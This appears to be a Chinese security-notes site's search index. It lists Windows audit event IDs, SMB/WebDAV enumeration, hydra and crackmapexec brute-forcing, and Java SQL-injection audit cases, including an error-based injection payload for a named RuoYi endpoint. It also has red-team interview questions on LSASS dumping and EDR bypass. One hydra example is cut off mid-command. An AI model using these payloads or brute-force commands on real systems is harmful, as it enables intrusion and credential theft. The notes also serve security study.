在解密传入消息时检测到完整性违规 4817 ----- 对象的审核设置已更改。 4818 ----- 建议的中央访问策略不授予与当前中央访问策略相同的访问权限 4819 ----- 计算机上的中央访问策略已更改 4820 ----- Kerberos 票证授予票证（TGT）被拒绝，因为该设备不符合访问控制限制 4821 ----- Kerberos 服务票证被拒绝，因为用户，设备或两者都不符合访问控制限制 4822 ----- NTLM 身份验证失败，因为该帐户是受保护用户组的成员 4823 ----- NTLM 身份验证失败，因为需要访问控制限制 4824 ----- 使用 DES 或 RC4 进行 Kerberos 预身份验证失败，因为该帐户是受保护用户组的成员 4825 ----- 用户被拒绝访问远程桌面。默认情况下，仅当用户是 Remote Desktop Users 组或 Administrators 组的成员时才允许用户进行连接 4826 ----- 加载引导配置数据 4830 ----- SID 历史记录已从帐户中删除 4864 ----- 检测到名称空间冲突 4865 ----- 添加了受信任的林信息条目 4866 ----- 已删除受信任的林信息条目 4867 ----- 已修改受信任的林信息条目 4868 ----- 证书管理器拒绝了挂起的证书请求 4869 ----- 证书服务收到重新提交的证书请求 4870 ----- 证书服务撤销了证书 4871 ----- 证书服务收到发布证书吊销列表（CRL）的请求 4872 ----- 证书服务发布证书吊销列表（CRL） 4873 ----- 证书申请延期已更改 4874 ----- 一个或多个证书请求属性已更改。 4875 ----- 证书服务收到关闭请求 4876 ----- 证书服务备份已启动 4877 ----- 证书服务备份已完成 4878 ----- 证书服务还原已开始 4879 ----- 证书服务恢复已完成 4880 ----- 证书服务已启动 4881 ----- 证书服务已停止 4882 ----- 证书服务的安全权限已更改 4883 ----- 证书服务检索到存档密钥 4884 ----- 证书服务将证书导入其数据库 4885 ----- 证书服务的审核筛选器已更改 4886 ----- 证书服务收到证书请求 4887 ----- 证书服务批准了证书请求并颁发了证书 4888 ----- 证书服务拒绝了证书请求 4889 ----- 证书服务将证书请求的状态设置为挂起 4890 ----- 证书服务的证书管理器设置已更改。 4891 ----- 证书服务中的配置条目已更改 4892 ----- 证书服务的属性已更改 4893 ----- 证书服务存档密钥 4894 ----- 证书服务导入并存档了一个密钥 4895 ----- 证书服务将 CA 证书发布到 Active Directory 域服务 4896 ----- 已从证书数据库中删除一行或多行 4897 ----- 启用角色分离 4898 ----- 证书服务加载了一个模板 4899 ----- 证书服务模板已更新 4900 ----- 证书服务模板安全性已更新 4902 ----- 已创建每用户审核策略表 4904 ----- 尝试注册安全事件源 4905 ----- 尝试取消注册安全事件源 4906 ----- CrashOnAuditFail 值已更改 4907 ----- 对象的审核设置已更改 4908 ----- 特殊组登录表已修改 4909 ----- TBS 的本地策略设置已更改 4910 ----- TBS 的组策略设置已更改 4911 ----- 对象的资源属性已更改 4912 ----- 每用户审核策略已更改 4913 ----- 对象的中央访问策略已更改 4928 ----- 建立了 Active Directory 副本源命名上下文 4929 ----- 已删除 Active Directory 副本源命名上下文 4930 ----- 已修改 Active Directory 副本源命名上下文 4931 ----- 已修改 Active Directory 副本目标命名上下文 4932 ----- 已开始同步 Active Directory 命名上下文的副本 4933 ----- Active Directory 命名上下文的副本的同步已结束 4934 ----- 已复制 Active Directory 对象的属性 4935 ----- 复制失败开始 4936 ----- 复制失败结束 4937 ----- 从副本中删除了一个延迟对象 4944 ----- Windows 防火墙启动时，以下策略处于活动状态 4945 ----- Windows 防火墙启动时列出了规则 4946 ----- 已对 Windows 防火墙例外列表进行了更改。增加了一条规则 4947 ----- 已对 Windows 防火墙例外列表进行了更改。规则被修改了 4948 ----- 已对 Windows 防火墙例外列表进行了更改。规则已删除 4949 ----- Windows 防火墙设置已恢复为默认值 4950 ----- Windows 防火墙设置已更改 4951 ----- 规则已被忽略，因为 Windows 防火墙无法识别其主要版本号 4952 ----- 已忽略规则的某些部分，因为 Windows 防火墙无法识别其次要版本号 4953 ----- Windows 防火墙已忽略规则，因为它无法解析规则 4954 ----- Windows 防火墙组策略设置已更改。已应用新设置 4956 ----- Windows 防火墙已更改活动配置文件 4957 ----- Windows 防火墙未应用以下规则 4958 ----- Windows 防火墙未应用以下规则，因为该规则引用了此计算机上未配置的项目 4960 ----- IPsec 丢弃了未通过完整性检查的入站数据包 4961 ----- IPsec 丢弃了重放检查失败的入站数据包 4962 ----- IPsec 丢弃了重放检查失败的入站数据包 4963 ----- IPsec 丢弃了应该受到保护的入站明文数据包 4964 ----- 特殊组已分配给新登录 4965 ----- IPsec 从远程计算机收到一个包含不正确的安全参数索引（SPI）的数据包。 4976 ----- 在主模式协商期间，IPsec 收到无效的协商数据包。 4977 ----- 在快速模式协商期间，IPsec 收到无效的协商数据包。 4978 ----- 在扩展模式协商期间，IPsec 收到无效的协商数据包。 4979 ----- 建立了 IPsec 主模式和扩展模式安全关联。 4980 ----- 建立了 IPsec 主模式和扩展模式安全关联 4981 ----- 建立了 IPsec 主模式和扩展模式安全关联 4982 ----- 建立了 IPsec 主模式和扩展模式安全关联 4983 ----- IPsec 扩展模式协商失败 4984 ----- IPsec 扩展模式协商失败 4985 ----- 交易状态已发生变化 5024 ----- Windows 防火墙服务已成功启动 5025 ----- Windows 防火墙服务已停止 5027 ----- Windows 防火墙服务无法从本地存储中检索安全策略 5028 ----- Windows 防火墙服务无法解析新的安全策略。 5029 ----- Windows 防火墙服务无法初始化驱动程序 5030 ----- Windows 防火墙服务无法启动 5031 ----- Windows 防火墙服务阻止应用程序接受网络上的传入连接。 5032 ----- Windows 防火墙无法通知用户它阻止应用程序接受网络上的传入连接 5033 ----- Windows 防火墙驱动程序已成功启动 5034 ----- Windows 防火墙驱动程序已停止 5035 ----- Windows 防火墙驱动程序无法启动 5037 ----- Windows 防火墙驱动程序检测到严重的运行时错 终止 5038 ----- 代码完整性确定文件的图像哈希无效 5039 ----- 注册表项已虚拟化。 5040 ----- 已对 IPsec 设置进行了更改。添加了身份验证集。 5041 ----- 已对 IPsec 设置进行了更改。身份验证集已修改 5042 ----- 已对 IPsec 设置进行了更改。身份验证集已删除 5043 ----- 已对 IPsec 设置进行了更改。添加了连接安全规则 5044 ----- 已对 IPsec 设置进行了更改。连接安全规则已修改 5045 ----- 已对 IPsec 设置进行了更改。连接安全规则已删除 5046 ----- 已对 IPsec 设置进行了更改。添加了加密集 5047 ----- 已对 IPsec 设置进行了更改。加密集已被修改 5048 ----- 已对 IPsec 设置进行了更改。加密集已删除 5049 ----- IPsec 安全关联已删除 5050 ----- 尝试使用对 INetFwProfile.FirewallEnabled 的调用以编程方式禁用 Windows 防火墙（FALSE 5051 ----- 文件已虚拟化 5056 ----- 进行了密码自检 5057 ----- 加密原语操作失败 5058 ----- 密钥文件操作 5059 ----- 密钥迁移操作 5060 ----- 验证操作失败 5061 ----- 加密操作 5062 ----- 进行了内核模式加密自检 5063 ----- 尝试了加密提供程序操作 5064 ----- 尝试了加密上下文操作 5065 ----- 尝试了加密上下文修改 5066 ----- 尝试了加密功能操作 5067 ----- 尝试了加密功能修改 5068 ----- 尝试了加密函数提供程序操作 5069 ----- 尝试了加密函数属性操作 5070 ----- 尝试了加密函数属性操作 5071 ----- Microsoft 密钥分发服务拒绝密钥访问 5120 ----- OCSP 响应程序服务已启动 5121 ----- OCSP 响应程序服务已停止 5122 ----- OCSP 响应程序服务中的配置条目已更改 5123 ----- OCSP 响应程序服务中的配置条目已更改 5124 ----- 在 OCSP Responder Service 上更新了安全设置 5125 ----- 请求已提交给 OCSP Responder Service 5126 ----- 签名证书由 OCSP Responder Service 自动更新 5127 ----- OCSP 吊销提供商成功更新了吊销信息 5136 ----- 目录服务对象已修改 5137 ----- 已创建目录服务对象 5138 ----- 目录服务对象已取消删除 5139 ----- 已移动目录服务对象 5140 ----- 访问了网络共享对象 5141 ----- 目录服务对象已删除 5142 ----- 添加了网络共享对象。 5143 ----- 网络共享对象已被修改 5144 ----- 网络共享对象已删除。 5145 ----- 检查网络共享对象以查看是否可以向客户端授予所需的访问权限 5146 ----- Windows 筛选平台已阻止数据包 5147 ----- 限制性更强的 Windows 筛选平台筛选器阻止了数据包 5148 ----- Windows 过滤平台检测到 DoS 攻击并进入防御模式；与此攻击相关的数据包将被丢弃。 5149 ----- DoS 攻击已经消退，正常处理正在恢复。 5150 ----- Windows 筛选平台已阻止数据包。 5151 ----- 限制性更强的 Windows 筛选平台筛选器阻止了数据包。 5152 ----- Windows 筛选平台阻止了数据包 5153 ----- 限制性更强的 Windows 筛选平台筛选器阻止了数据包 5154 ----- Windows 过滤平台允许应用程序或服务在端口上侦听传入连接 5155 ----- Windows 筛选平台已阻止应用程序或服务侦听端口上的传入连接 5156 ----- Windows 筛选平台允许连接 5157 ----- Windows 筛选平台已阻止连接 5158 ----- Windows 筛选平台允许绑定到本地端口 5159 ----- Windows 筛选平台已阻止绑定到本地端口 5168 ----- SMB / SMB2 的 Spn 检查失败。 5169 ----- 目录服务对象已修改 5170 ----- 在后台清理任务期间修改了目录服务对象 5376 ----- 已备份凭据管理器凭据 5377 ----- Credential Manager 凭据已从备份还原 5378 ----- 策略不允许请求的凭据委派 5440 ----- Windows 筛选平台基本筛选引擎启动时出现以下 callout 5441 ----- Windows 筛选平台基本筛选引擎启动时存在以下筛选器 5442 ----- Windows 筛选平台基本筛选引擎启动时，存在以下提供程序 5443 ----- Windows 筛选平台基本筛选引擎启动时，存在以下提供程序上下文 5444 ----- Windows 筛选平台基本筛选引擎启动时，存在以下子层 5446 ----- Windows 筛选平台标注已更改 5447 ----- Windows 筛选平台筛选器已更改 5448 ----- Windows 筛选平台提供程序已更改 5449 ----- Windows 筛选平台提供程序上下文已更改 5450 ----- Windows 筛选平台子层已更改 5451 ----- 建立了 IPsec 快速模式安全关联 5452 ----- IPsec 快速模式安全关联已结束 5453 ----- 与远程计算机的 IPsec 协商失败，因为未启动 IKE 和 AuthIP IPsec 密钥模块（IKEEXT）服务 5456 ----- PAStore 引擎在计算机上应用了 Active Directory 存储 IPsec 策略 5457 ----- PAStore 引擎无法在计算机上应用 Active Directory 存储 IPsec 策略 5458 ----- PAStore 引擎在计算机上应用了 Active Directory 存储 IPsec 策略的本地缓存副本 5459 ----- PAStore 引擎无法在计算机上应用 Active Directory 存储 IPsec 策略的本地缓存副本 5460 ----- PAStore 引擎在计算机上应用了本地注册表存储 IPsec 策略 5461 ----- PAStore 引擎无法在计算机上应用本地注册表存储 IPsec 策略 5462 ----- PAStore 引擎无法在计算机上应用某些活动 IPsec 策略规则 5463 ----- PAStore 引擎轮询活动 IPsec 策略的更改并检测不到任何更改 5464 ----- PAStore 引擎轮询活动 IPsec 策略的更改，检测到更改并将其应用于 IPsec 服务 5465 ----- PAStore Engine 收到强制重新加载 IPsec 策略的控件并成功处理控件 5466 ----- PAStore 引擎轮询 Active Directory IPsec 策略的更改，确定无法访问 Active Directory，并将使用 Active Directory IPsec 策略的缓存副本 5467 ----- PAStore 引擎轮询 Active Directory IPsec 策略的更改，确定可以访问 Active Directory，并且未找到对策略的更改 5468 ----- PAStore 引擎轮询 Active Directory IPsec 策略的更改，确定可以访问 Active Directory，找到策略更改并应用这些更改 5471 ----- PAStore 引擎在计算机上加载了本地存储 IPsec 策略 5472 ----- PAStore 引擎无法在计算机上加载本地存储 IPsec 策略 5473 ----- PAStore 引擎在计算机上加载了目录存储 IPsec 策略 5474 ----- PAStore 引擎无法在计算机上加载目录存储 IPsec 策略 5477 ----- PAStore 引擎无法添加快速模式过滤器 5478 ----- IPsec 服务已成功启动 5479 ----- IPsec 服务已成功关闭 5480 ----- IPsec 服务无法获取计算机上的完整网络接口列表 5483 ----- IPsec 服务无法初始化 RPC 服务器。无法启动 IPsec 服务 5484 ----- IPsec 服务遇到严重故障并已关闭 5485 ----- IPsec 服务无法在网络接口的即插即用事件上处理某些 IPsec 筛选器 5632 ----- 已请求对无线网络进行身份验证 5633 ----- 已请求对有线网络进行身份验证 5712 ----- 尝试了远程过程调用（RPC） 5888 ----- COM +目录中的对象已被修改 5889 ----- 从 COM +目录中删除了一个对象 5890 ----- 一个对象已添加到 COM +目录中 6144 ----- 组策略对象中的安全策略已成功应用 6145 ----- 处理组策略对象中的安全策略时发生一个或多个错误 6272 ----- 网络策略服务器授予用户访问权限 6273 ----- 网络策略服务器拒绝访问用户 6274 ----- 网络策略服务器放弃了对用户的请求 6275 ----- 网络策略服务器放弃了用户的记帐请求 6276 ----- 网络策略服务器隔离了用户 6277 ----- 网络策略服务器授予用户访问权限，但由于主机未满足定义的健康策略而将其置于试用期 6278 ----- 网络策略服务器授予用户完全访问权限，因为主机符合定义的健康策略 6279 ----- 由于重复失败的身份验证尝试，网络策略服务器锁定了用户帐户 6280 ----- 网络策略服务器解锁了用户帐户 6281 ----- 代码完整性确定图像文件的页面哈希值无效。.. 6400 ----- BranchCache：在发现内容可用性时收到格式错误的响应。 6401 ----- BranchCache：从对等方收到无效数据。数据被丢弃。 6402 ----- BranchCache：提供数据的托管缓存的消息格式不正确。 6403 ----- BranchCache：托管缓存发送了对客户端消息的错误格式化响应以提供数据。 6404 ----- BranchCache：无法使用配置的 SSL 证书对托管缓存进行身份验证。 6405 ----- BranchCache：发生了事件 ID％1 的％2 个实例。 6406 ----- ％1 注册到 Windows 防火墙以控制以下过滤： 6408 ----- 已注册的产品％1 失败，Windows 防火墙现在正在控制％2 的过滤。 6409 ----- BranchCache：无法解析服务连接点对象 6410 ----- 代码完整性确定文件不满足加载到进程中的安全性要求。这可能是由于使用共享部分或其他问题 6416 ----- 系统识别出新的外部设备。 6417 ----- FIPS 模式加密自检成功 6418 ----- FIPS 模式加密自检失败 6419 ----- 发出了禁用设备的请求 6420 ----- 设备已禁用 6421 ----- 已发出请求以启用设备 6422 ----- 设备已启用 6423 ----- 系统策略禁止安装此设备 6424 ----- 在事先被政策禁止之后，允许安装此设备 8191 ----- 最高系统定义的审计消息值 "},{"id":57,"href":"/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/2.%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/motd/","title":"Motd","section":"Docs","content":" motd # "},{"id":58,"href":"/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/2.%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/MySQL/","title":"My SQL","section":"Docs","content":" MySQL服务安全 # MySQL命令 # mysql -u \u0026lt;user\u0026gt; -p "},{"id":59,"href":"/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/2.%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/Redis/","title":"Redis","section":"Docs","content":" Redis # https://blog.csdn.net/qq_48201589/article/details/136760062\nhttps://www.freebuf.com/articles/web/289231.html\n"},{"id":60,"href":"/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/2.%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/smb/","title":"Smb","section":"Docs","content":" smb # smb 版本探测 # use auxiliary/scanner/smb/smb_version set RHOSTS 192.168.112.38 run smbmap # smbmap -H smbclient 使用 # Smbclient 是一个用于连接 SMB 服务的客户端工具，可以用于在渗透测试中枚举和访问共享文件、资源和服务。Smbclient 的使用方法如下：\n可以使用 smbclient 命令来连接 SMB 服务，其基本语法是： smbclient //[host]/[share] -U [user] 其中，[host] 是目标主机的 IP 地址或主机名，[share] 是要访问的共享名，[user] 是要使用的用户名，如果不指定，则默认为 guest。 例如，如果要以 guest 用户连接到 192.168.1.100 主机的 public 共享，可以使用以下命令： smbclient //192.168.1.100/public -U guest 如果要以指定的密码连接，可以在用户名后加上%符号和密码，例如： smbclient //192.168.1.100/public -U guest%123456 连接成功后，会进入一个类似于 FTP 的交互式 shell，可以使用一些常用的命令来操作共享文件和资源，例如： ls：列出当前目录下的文件和子目录 cd：切换目录 get：下载文件到本地 put：上传文件到远程 mget：批量下载文件 mput：批量上传文件 del：删除文件 mkdir：创建目录 rmdir：删除目录 exit：退出 smbclient 如果不知道目标主机的共享名，可以使用-L 选项来列出所有可用的共享，其语法是： smbclient -L [host] -U [user] 例如，如果要以 guest 用户列出 192.168.1.100 主机的所有共享，可以使用以下命令： smbclient -L 192.168.1.100 -U guest smbclient 还支持一些高级选项和功能，例如： -N：不使用密码进行连接 -I：指定目标主机的 IP 地址，而不是通过 NetBIOS 名称解析 -p：指定 SMB 服务的端口号，默认为 139 -c：执行指定的命令，而不进入交互式 shell -E：将错误信息输出到标准错误流 -d：设置调试级别，范围为 0-10 -t：指定 SMB 协议的超时时间，单位为秒 -A：指定一个包含用户名和密码的文件，而不是交互式输入 -M：向指定的主机发送一个消息，类似于 net send 命令 -T：使用 tar 格式备份或还原文件 -R：指定要使用的名称解析顺序，例如 bcast, wins, hosts, lmhosts -n：指定要使用的 NetBIOS 名称，而不是从配置文件中读取 -m：指定要使用的 SMB 协议版本，例如 SMB1, SMB2, SMB3 -P：指定是否使用 SMB 签名，0 表示禁用，1 表示启用，2 表示必需 -k：指定是否使用 Kerberos 认证，需要配置 krb5.conf 文件 -s：指定 smbclient 的配置文件，而不是默认的 smb.conf (1) SMB 渗透测试常规思路_smb 截图 渗透_redwand 的博客 \u0026hellip;. https://blog.csdn.net/redwand/article/details/113730414.\n(2) 渗透测试之 SMB 枚举指南 - 知乎。https://zhuanlan.zhihu.com/p/356104384.\n(3) 黑客靶场练习 (SMB 匿名登录，制作反弹 shell, 一键提权） - 知乎。https://zhuanlan.zhihu.com/p/385973632.\n(4) 常见的端口服务渗透 (1.SMB 端口渗透） - 知乎。https://zhuanlan.zhihu.com/p/377692326.\n(5) 渗透测试中 SMB 服务（139、445 端口）枚举汇总 - 腾讯云。https://cloud.tencent.com/developer/article/1615418.\n(6) undefined. https://nmap.org.\n(7) undefined. https://nmap.org/submit/.\n"},{"id":61,"href":"/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/2.%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/VNC/","title":"Vnc","section":"Docs","content":" VNC # 密码解密 # https://github.com/frizb/PasswordDecrypts\n"},{"id":62,"href":"/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/2.%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/webdav/","title":"Webdav","section":"Docs","content":" webdav # davtest # davtest -url \u0026lt;url\u0026gt; -auth \u0026lt;user\u0026gt;:\u0026lt;pass\u0026gt;\n列出权限和可上传或执行文件类型\ncadaver # cadaver \u0026lt;url\u0026gt;\nwebdav 客户端\n"},{"id":63,"href":"/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/3.FUZZ/FUZZ/","title":"Fuzz","section":"Docs","content":" FUZZ # "},{"id":64,"href":"/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/3.FUZZ/%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7/","title":"爆破工具","section":"Docs","content":" 爆破工具 # hydra（账户爆破，速度更快） # Supported services # adam6500 asterisk cisco cisco-enable cobaltstrike cvs firebird ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp 示例 # 爆破POST登录表单\nhydra -l [用户名] -P [密码列表文件] [目标IP] http-post-form \u0026#34;[登录页面路径]:[请求体]\u0026amp;[成功/失败条件]\u0026#34; 其中：\n-l 代表登录名。 -P 代表密码列表文件路径。 [登录页面路径] 是表单提交的路径。 [请求体] 是 POST 请求的主体，通常包括用户名和密码字段，格式为 username=^USER^\u0026amp;password=^PASS^，其中 ^USER^ 和 ^PASS^ 是 Hydra 的占位符。 [成功/失败条件] 根据登录成功或失败的页面响应来定义。\n例如：\nhydra -l admin -P crackmapexec（账户爆破） # protocols: available protocols {ldap,winrm,ssh,ftp,rdp,smb,mssql} ldap own stuff using LDAP winrm own stuff using WINRM ssh own stuff using SSH ftp own stuff using FTP rdp own stuff using RDP smb own stuff using SMB mssql own stuff using MSSQL "},{"id":65,"href":"/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/4.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E5%AE%A1%E8%AE%A1/CodeQL-Java/","title":"Code Ql Java","section":"Docs","content":" CodeQL-Java # 语法：https://codeql.github.com/docs/codeql-language-guides/codeql-library-for-java/\nClass Tree # Element Package CompilationUnit Type PrimitiveType boolean byte char double float int long short void \u0026lt;nulltype\u0026gt; Reftype Class Interface EnumType Array Method Constructor Variable "},{"id":66,"href":"/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/4.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E5%AE%A1%E8%AE%A1/SQL%E6%B3%A8%E5%85%A5/","title":"Sql注入","section":"Docs","content":" Java审计-SQL注入 # 三种数据库模式 # JDBC：Java Database Connectivity，Java数据库连接，是一种用于执行SQL语句的Java API，可以为多种关系数据库提供统一访问，它由一组用Java语言编写的类和接口组成。\nMybatis（最常用）：MyBatis是一个优秀的持久层框架，它对jdbc的操作数据库的过程进行封装，使开发者只需要关注 SQL 本身，而不需要花费精力去处理例如注册驱动、创建connection、创建statement、手动设置参数、结果集检索等jdbc繁杂的过程代码。\nHibernate：Hibernate是一个开放源代码的对象关系映射框架，它对JDBC进行了非常轻量级的对象封装，它将POJO与数据库表建立映射关系，是一个全自动的orm框架，hibernate可以自动生成SQL语句，自动执行，使得Java程序员可以使用面向对象的思维来操纵数据库。\n判断是否出现注入 # 原生JDBC是否存在直接拼接SQL语句（使用+，或者使用StringBUilder append()），未经过预编译； Mybatis使用${}； Hibernate、JPA默认是经过预编译的，但是如果开发自己编写的SQL语句，也需要进行检查； Java是强类型语言，当注入参数为long、int等数字类型时无法进行注入； 找到危险函数位置之后，向上搜索，找函数、方法调用位置，直到请求入口（controller层），判断是否存在无害化处理、无害化处理是否严格； 参考：https://mp.weixin.qq.com/s/9t3t6qxosGsKiXMIRtMoPw\n判断使用的数据库模式 # 看项目说明使用的技术框架 看引用中加载那些技术框架 看配置源码中相关配置文件 入口确定 # 是否使用预编译技术，预编译是否完整。 定位SQL语句上下文，查看是否有参数直接拼接，是否有对模糊查询关键字的过滤。 Mybatis框架则搜索${}，四种情况无法预编译：like模糊查询、order by排序、范围查询in、动态表名/列名，只能拼接，所以还是需要手工防注入，此时可查看相关逻辑是否正确。 JPA搜索JpaSort.unsafe()，查看是否用实体之外的字段对查询结果排序，进行了SQL的拼接。以及查看EntityManager的使用，也可能存在拼接SQL的情况。 Statement createStatement PrepareStatement like '%${ in(${ in (${ select update insert delete ${ order by setObject( setInt( setString( setSQLXML( createQuery( createSQLQuery( createNativeQuery \u0026hellip;\u0026hellip;. 案例1-非框架JDBC-Jfinal_cms论坛系统 # https://github.com/jflyfox/jfinal_cms 分析：确定非框架-\u0026gt;搜关键字order by append-\u0026gt;getBaseForm()-\u0026gt;getOrderBy()-\u0026gt;getOrderColumn-\u0026gt;orderColumn 路由：Post: /admin/advicefeedback/list 参数：form.orderColumn 拼接：order by \u0026quot;).append(orderBy); Poc：' xxx # (直接sqlmap梭哈) 案例2-SpringBoot+Mybatis-Oasys办公系统 # https://gitee.com/aaluoxiang/oa_system 分析：确定Mybatis框架-\u0026gt;搜关键字${-\u0026gt;%${baseKey}%-\u0026gt;sortMyNotice-\u0026gt;sortMyNotice-\u0026gt;informListPaging-\u0026gt; 路由：Post: /informlistpaging 参数：baseKey 拼接：and n.title LIKE '%${baseKey}%' Poc：' xxx # (直接sqlmap梭哈) 案例3-SpringBoot+Mybatis-Ruoyi若依系统 V4.6 # https://gitee.com/y_project/RuoYi 基于springboot中，执行SQL三个调用： 业务层调用dao层 controller调用Service层间接调用dao层 controller直接调用dao层 分析：确定Mybatis框架-\u0026gt;搜关键字${-\u0026gt;updateDeptStatus-\u0026gt;updateParentDeptStatus-\u0026gt;updateDept-\u0026gt;editSave 路由：Post: /system/dept/edit 参数：ancestors 拼接：where dept_id in (${ancestors}) Poc：DeptName=1\u0026amp;DeptId=100\u0026amp;ParentId=12\u0026amp;Status=0\u0026amp;OrderNum=1\u0026amp;ancestors=0)or(extractvalue(1,concat((select user()))));# "},{"id":67,"href":"/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/4.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP%E5%AE%A1%E8%AE%A1/SQL%E6%B3%A8%E5%85%A5/","title":"Sql注入","section":"Docs","content":" SQL注入 # 正则搜索 # (update|select|insert|delete).*?where.*=\n功能跟踪 # 语句监控 # "},{"id":68,"href":"/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/4.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%B7%A5%E5%85%B7/","title":"工具","section":"Docs","content":" 工具 # 专用型代码审计工具 # bandit (Python) # https://github.com/PyCQA/bandit\nNodeJsScan # https://github.com/ajinabraham/NodeJsScan\ngosec # https://github.com/securego/gosec\nKunlun-M (PHP\u0026amp;JS) # https://github.com/LoRexxar/Kunlun-M\nbrakeman (Ruby) # https://github.com/presidentbeef/brakeman\nOpenSCA Xcheck (Java依赖组件) # https://plugins.jetbrains.com/plugin/18246-opensca-xcheck\n综合型代码审计工具 # Fortify # https://www.microfocus.com/en-us/products/application-security-testing/overview\nCheckmarx # https://www.checkmarx.com/\nVeracode # https://www.veracode.com/\n"},{"id":69,"href":"/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/5.%E6%BC%8F%E6%89%AB%E5%B7%A5%E5%85%B7/searchsploit/","title":"Searchsploit","section":"Docs","content":" searchsploit # 基本用法 # Usage: searchsploit [options] term1 [term2] ... [termN] searchsploit afd windows local searchsploit -t oracle windows searchsploit -p 39446 searchsploit linux kernel 3.2 --exclude=\u0026#34;(PoC)|/dos/\u0026#34; searchsploit -s Apache Struts 2.0.0 searchsploit linux reverse password searchsploit -j 55555 | jq searchsploit --cve 2021-44228 搜索 cve # searchsploit -cve 2019-0708\n根据编号展示路径 # searchsploit -p 29930\n将目标文件复制到当前目录 # searchsploit -m 29930\n"},{"id":70,"href":"/docs/%E7%BA%A2%E9%98%9F%E8%A1%8C%E5%8A%A8/%E7%BA%A2%E9%98%9F%E9%9D%A2%E8%AF%95/","title":"红队面试","section":"Docs","content":" 红队面试 # 德勒师傅所遇到的一些红队岗位面试题。总而言之，大部分以所做项目以及基于情景的开放式回答为主，八股文类问题很少。\n大部分不是很难，但比较tricky，因为不同的人的回答都可能是对的，但却能透露出不同候选者的资历。面试与考试不同，并非拿到90分就万岁，而是要做到回答地比别人更好。\n某大型零售企业 # 形式：经理+小组面\n你觉得该公司中最常见的3个密码是什么？\nXML和JSON的异同\nBase64编码的作用\n计算机网络的基础问题\nLSASS.EXE的重要性\nWindows上怎么导出凭证\n基于凭证窃取的钓鱼基础设施搭建(EvilNginx)\nSSH登陆失败，分析原因\n怎么离线解析lsass.dmp\n根据恶意软件中所用的API的描述，说出其名称(例如RtlMoveMemory)\n(忘了前提条件和背景了)如何绕过EDR？\n谈谈docker\nAnsible和Terraform的异同\n拿到了AWS控制面板后会怎么做？\n任选一云平台，并说出有哪些持久化方式\n配置主机的时候，都会安装哪些工具软件？\n相比渗透测试，你为什么更喜欢红队？\n你会更倾向于用NTLM哈希进行横向移动，还是TGT/TGS？\n某一LOLBAS的用法\n通过SSH隧道或代理运行bloodhound的优势\n发表红队工具的道德问题，你怎么看？\n某国际组织 # 形式：共经历4轮，2轮小组面，2轮经理面，跨越4个月。\n针对简历以及项目细节的追问，问得非常细\n针对不同类型的渗透，你分别都会用哪些工具？\nSliver有哪些Cobalt Strike默认不具备的优势？\n怎么拓展CobaltStrike来改善OPSEC？\n云渗透与内网渗透的区别？\n云渗透的思路\n怎么在云上横向移动？\n怎么在云上实现特权提升？\n在云上，都有哪些方法获得凭证？\n如果你发现了Azure AD的access token，会怎么进行利用？\nAzure上条件访问的相关话题\nAPI渗透与WEB渗透的异同\n基于OTP与MFA的攻击，以及追加提问\n如果报告对象不同意你渗透测试报告中的发现，你会怎么反驳？\n作为网络安全人士，最让你紧张的事情？\n如何发现API终端，用哪些工具？\n怎么发现内部的API终端？\nChatgpt在网络安全方面的隐患？\n让你压力最大的一次经历\n你最骄傲的一次经历\n你是怎么写渗透测试报告的，都有哪些部分？\n怎么安全地跟客户传输敏感文件，例如渗透测试报告、凭证等？\n如果你作为个人，独立地提供渗透测试服务，你又会怎么安全地跟客户传输敏感文件？\n某大型投资公司 # 形式：共2轮，小组面+经理面\n基于场景的红队流程\n被外部侦查阶段，你会怎么做？\n背景：通过钓鱼的客户端代码执行，获得了一数据库管理员的主机\n拿到shell后，首先做什么？\n通过BloodHound，你没有发现该用户对其他主机的直接访问(例如本地管理员特权)。你会怎么判断他对哪些主机具有哪些访问特权？\n在行动中，遇到一0 day漏洞，你会使用公开的exp吗？\n如果能污染供应链，你会怎么做，有哪些需要注意的？\n某社交媒体互联网公司 # 形式：共2轮，1+4小时。\n因为刚进行，搜集的内容不多\n你会代码吗，用哪些语言？\n你有自己开发工具吗？\n基于场景的红队流程(主要是侦查与外网部分)\n当你有了个有趣的发现的时候，你会怎么做？立刻投入行动还是先思考？\n"}]